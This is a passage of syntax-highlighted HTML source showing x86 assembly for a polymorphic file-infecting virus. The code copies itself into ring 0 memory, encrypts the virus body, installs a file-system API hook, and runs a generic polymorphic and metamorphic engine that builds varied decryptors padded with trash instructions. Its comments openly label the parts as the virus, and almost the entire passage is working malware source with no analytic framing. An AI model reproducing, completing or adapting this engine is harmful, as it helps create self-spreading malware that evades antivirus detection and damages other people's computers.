        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">MemoryTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; difference in mem</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DecryptorPos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; add to get new pos</span><span class="sc0">




        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; copy polycode to ring 0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">MemorySize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*(</span><span class="sc2">8</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">VirtualDataSegment</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
                                                
                                                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VirtualDataSegment</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; pointer to virtual data</span><span class="sc0">
                                                </span><span class="sc1">; segment</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Mem1Table</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; how much data does the</span><span class="sc0">
                                                </span><span class="sc1">; decryptor and guide need</span><span class="sc0">
                                                </span><span class="sc1">; predefined</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

     </span><span class="sc5">CopyDataToVirtualDataSegment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; where in datasegment should</span><span class="sc0">
                                                </span><span class="sc1">; we write the data</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; push the data to write</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; write it to virtual data seg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; point to next data block</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CopyDataToVirtualDataSegment</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">VirusInRing0Mem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirusStart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; copy virus to ring 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">; encrypt virus in memory</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Encryptor</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; pointer to virus in ring0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; pointer to pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PointerToDataSlack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">    </span><span class="sc1">; all special variables</span><span class="sc0">
                                                </span><span class="sc1">; points to pointer to</span><span class="sc0">
                                                </span><span class="sc1">; virus in ring 0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">; copy residentcode to mem</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ResidentcodeStart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ResidentcodeEnd</span><span class="sc4">-</span><span class="sc5">ResidentcodeStart</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">





</span><span class="sc1">; hook API function</span><span class="sc0">
                                                </span><span class="sc1">; edi is on stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">InstallFileSystemAPIhook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; 0 edi left on stack</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ResidentcodeStart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">BasePtr</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OldAPIFunction</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">BreakPoint1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">BreakPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">BreakPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">

</span><span class="sc5">ErrorRing0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">

















        

</span><span class="sc5">CreateGuideAndDecryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">LMEM_FIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">AllocMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">MemPtr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">






        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Guide</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LinkedListPolymorpher</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Polymorph</span><span class="sc0">                       </span><span class="sc1">; create Guide</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GuidePos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">GuideSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Decryptor</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LinkedListPolymorpher</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Polymorph</span><span class="sc0">                       </span><span class="sc1">; create Decryptor</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DecryptorPos</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">MemoryTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UndefineRegistersAndMem</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">HowMuchTrash</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_trash</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">FindTrashInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EndOfTrashInstructions</span><span class="sc0">                
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FindTrashInstruction</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FindTrashInstruction</span><span class="sc0">

     </span><span class="sc5">EndOfTrashInstructions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ReallyEnd</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FindTrashInstruction</span><span class="sc0">

     </span><span class="sc5">ReallyEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">   
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MutateCode</span><span class="sc0">                      </span><span class="sc1">; Generic polymorphing</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">FindDecryptInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'R['</span><span class="sc0">                        
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasw</span><span class="sc0">                           </span><span class="sc1">; find [R</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">',]'</span><span class="sc0">                        </span><span class="sc1">; is this [Rx],</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FindDecryptInstruction</span><span class="sc0">          </span><span class="sc1">; if not, continue looking</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc5">Op_xor</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CompileEncryptor</span><span class="sc0">            

        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc5">Op_add</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_sub</span><span class="sc0">
                </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CompileEncryptor</span><span class="sc0">            
        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Op_add</span><span class="sc0">
                </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CompileEncryptor</span><span class="sc0">            
        </span><span class="sc9">.endif</span><span class="sc0">


    </span><span class="sc5">CompileEncryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Encryptor</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

        



        </span><span class="sc6">ret</span><span class="sc0">
        



</span><span class="sc1">; ---------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; --------------------------- The generic polymorpher </span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; esi = Data to polymorph</span><span class="sc0">
</span><span class="sc1">; edi = where to put the created data</span><span class="sc0">

</span><span class="sc1">; Returns</span><span class="sc0">
</span><span class="sc1">; esi = start of created data</span><span class="sc0">
</span><span class="sc1">; edi = end of created data/start of created code</span><span class="sc0">
</span><span class="sc1">; eax = size of the created code</span><span class="sc0">

</span><span class="sc1">; Defined opcode looks</span><span class="sc0">
</span><span class="sc5">Op_add</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'add '</span><span class="sc0">
</span><span class="sc5">Op_and</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'and '</span><span class="sc0">
</span><span class="sc5">Op_mov</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'mov '</span><span class="sc0">
</span><span class="sc5">Op_or</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'or  '</span><span class="sc0">
</span><span class="sc5">Op_sub</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'sub '</span><span class="sc0">
</span><span class="sc5">Op_xor</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'xor '</span><span class="sc0">


</span><span class="sc5">Op_cmp</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'cmp '</span><span class="sc0">
</span><span class="sc5">Op_jnz</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'jnz '</span><span class="sc0">
</span><span class="sc5">Op_jnb</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'jnb '</span><span class="sc0">
</span><span class="sc5">Op_jna</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'jna '</span><span class="sc0">
</span><span class="sc5">Op_jmp</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'jmp '</span><span class="sc0">

</span><span class="sc5">Op_offset</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'ofs '</span><span class="sc0">
</span><span class="sc5">Op_db</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'db  '</span><span class="sc0">                  </span><span class="sc1">; output whats in there,</span><span class="sc0">
                                                </span><span class="sc1">; dont polymorph,</span><span class="sc0">
                                                </span><span class="sc1">; dont compile</span><span class="sc0">

</span><span class="sc5">Op_dontparse</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'!emu'</span><span class="sc0">                  </span><span class="sc1">; dont polymorph only </span><span class="sc0">
                                                </span><span class="sc1">; compile</span><span class="sc0">


</span><span class="sc1">; special opcodes</span><span class="sc0">
</span><span class="sc5">Op_encrypt</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'cpt '</span><span class="sc0">                  </span><span class="sc1">; encrypt this operand,</span><span class="sc0">
                                                </span><span class="sc1">; used to create encryptor/</span><span class="sc0">
                                                </span><span class="sc1">; decryptor</span><span class="sc0">

</span><span class="sc5">Op_setinfo</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'nfo '</span><span class="sc0">                  </span><span class="sc1">; set info of operand</span><span class="sc0">
                                                </span><span class="sc1">; used to define a operand</span><span class="sc0">
                                                </span><span class="sc1">; changable or similar.</span><span class="sc0">
</span><span class="sc5">Op_prefix</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'pfx '</span><span class="sc0">                  </span><span class="sc1">; prefix, eg fs:, es: and</span><span class="sc0">
                                                </span><span class="sc1">; similar. Will be deleted</span><span class="sc0">
                                                </span><span class="sc1">; in future versions</span><span class="sc0">

</span><span class="sc5">Op_trash</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'trsh'</span><span class="sc0">                  </span><span class="sc1">; how mush trash to be</span><span class="sc0">
                                                </span><span class="sc1">; produced, use wisely</span><span class="sc0">
                                                </span><span class="sc1">; to make your code better</span><span class="sc0">
                                                </span><span class="sc1">; or when you need to save</span><span class="sc0">
                                                </span><span class="sc1">; the flags</span><span class="sc0">





</span><span class="sc5">LinkedListPolymorpher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TablePolymorpher</span><span class="sc0">                 </span><span class="sc1">; 'old' style polymorphics</span><span class="sc0">

</span><span class="sc1">; esi -&gt; created data</span><span class="sc0">
</span><span class="sc1">; edi -&gt; created data+sizeof (created data)+1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Polymorph</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MutateCode</span><span class="sc0">                      </span><span class="sc1">; Generic polymorphing</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">; esi -&gt; created data</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Optimize</span><span class="sc0">                        </span><span class="sc1">; Optimize the created code</span><span class="sc0">

</span><span class="sc1">; esi -&gt; created data</span><span class="sc0">
</span><span class="sc1">; edi -&gt; created data+sizeof (created data)+1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compile</span><span class="sc0">                         </span><span class="sc1">; compile the code to get </span><span class="sc0">
                                                </span><span class="sc1">; the size</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">Regs</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">Registers</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Regs</span><span class="sc0">
</span><span class="sc5">InfoPtr</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">





</span><span class="sc1">; This polymorher is a bit different from the usuall one.</span><span class="sc0">
</span><span class="sc1">; It's able to create code that does different things, not just</span><span class="sc0">
</span><span class="sc1">; the same with a different look. </span><span class="sc0">




</span><span class="sc5">TablePolymorpher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; A nice recursive function :)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ReadInstruction</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; 'execute' function</span><span class="sc0">
